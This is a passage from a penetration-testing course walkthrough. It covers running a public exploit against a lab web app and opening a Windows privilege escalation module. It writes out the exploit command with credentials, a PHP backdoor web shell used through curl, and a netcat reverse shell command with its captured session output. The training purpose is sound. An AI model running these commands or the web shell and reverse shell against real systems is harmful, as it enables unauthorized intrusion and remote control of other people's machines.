### Credential Discovery and Exploit Execution

**Credential Discovery:**
Credentials were discovered, and the exploit arguments were determined by reviewing the source code and the usage section of the script. Not all exploits include a usage section; some require modifying variables within the source code before execution.

**Exploit Command:**
```bash
kali@kali:~$ python3 50944.py -url http://192.168.50.11/project/ -u PI:EMAIL -p AIDevCorp
```

**Note:**
You cannot use the designated admin account because they do not have a `myAccount` page.

**DateStamp:**
2022-06-15 12:19

**Backdoor Upload:**
The backdoor was uploaded to:
```
http://192.168.50.11/project/uploads/users/420919-backdoor.php?cmd=whoami
```

**Exploit Completion:**
The exploit completed successfully with an uploaded file.

**Verification:**
The output of the exploit produced an error, but further investigation confirmed it worked. The exploit uploaded a command shell to the `projects/uploads/users/` directory. We can use `curl` to verify if we have command execution with this PHP file.

**Command Execution:**
```bash
kali@kali:~$ curl http://192.168.50.11/project/uploads/users/420919-backdoor.php?cmd=whoami
www-data
```

**Result:**
The `whoami` command returned `www-data`, indicating that the PHP script was executed by the `www-data` system account.

**Further Enumeration:**
We can now enumerate more information from this web shell inside our target. The goal is to get a reverse shell into the machine. First, let's check if `nc` (netcat) is installed on the target.

**Check for Netcat:**
```bash
kali@kali:~$ curl http://192.168.50.11/project/uploads/users/420919-backdoor.php --data-urlencode "cmd=which nc"
/usr/bin/nc
```

**Netcat Installation:**
`nc` is installed on the target machine. Let's create a netcat listener on port 6666 and attempt to get a reverse shell from the target to our Kali machine.

**Netcat Listener:**
```bash
kali@kali:~$ nc -lvnp 6666
listening on [any] 6666 ...
```

**Reverse Shell Attempt:**
```bash
kali@kali:~$ curl http://192.168.50.11/project/uploads/users/420919-backdoor.php --data-urlencode "cmd=nc -nv 192.168.50.129 6666 -e /bin/bash"
```

**Connection Established:**
```bash
kali@kali:~$ nc -lvnp 6666
listening on [any] 6666 ...
connect to [192.168.50.129] from (UNKNOWN) [192.168.50.11] 57956
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

**Conclusion:**
The netcat reverse shell successfully connected to our Kali machine, and we are currently the `www-data` user.

### Best Practices for Exploit Usage

- **Service and Version Identification:** Identify the service and its version to find any pre-existing exploits.
- **Code Review:** Review the exploit code before execution to avoid malicious activity.
- **Gather Necessary Information:** Gather required details such as login credentials for the exploit.

### Module Summary

**Module 15: Exploiting Publicly-Known Vulnerabilities**

In this module, we covered the risks associated with running code written by untrusted authors and discussed various online and offline resources for exploit code. We also demonstrated how to use these resources to find and execute public exploits during penetration testing.

**Module 16: Windows Privilege Escalation**

#### Learning Objectives:

- **Understand Windows Privileges and Access Control Mechanisms:**
  - Security Identifier (SID)
  - Access Tokens
  - Mandatory Integrity Control
  - User Account Control (UAC)

- **Obtain Situational Awareness:**
  - Gather key information about the target system, including usernames, group memberships, OS version, network information, and running processes.

#### Key Concepts:

- **Security Identifier (SID):**
  - A unique value assigned to each entity (user or group) for access control management.
  - Example SID: `S-1-5-21-1336799502-1441772794-948155058-1001`

- **Access Tokens:**
  - Generated upon user authentication, containing SIDs, group memberships, and privileges.
  - Primary and impersonation tokens.

- **Mandatory Integrity Control:**
  - Controls access to securable objects using integrity levels (System, High, Medium, Low).

- **User Account Control (UAC):**
  - Protects the OS by running most applications with standard user privileges, even for administrative users.

#### Situational Awareness:

- **Key Information to Gather:**
  - Username and hostname
  - Group memberships of the current user
  - Existing users and groups
  - Operating system, version, and architecture
  - Network information
  - Installed applications
  - Running processes

**Example:**
Assuming we have a bind shell on port 4444 through a client-side attack, we can gather the necessary information to understand the target system and identify potential privilege escalation vectors.

**Note:**
If the connection to the bind shell is terminated, you may need to re-establish the connection to continue the enumeration and exploitation process.

---

**PWK - Copyright Â© 2023 OffSec Services Limited. All rights reserved.**

**Made in Morocco**

**Penetration Testing with Kali Linux**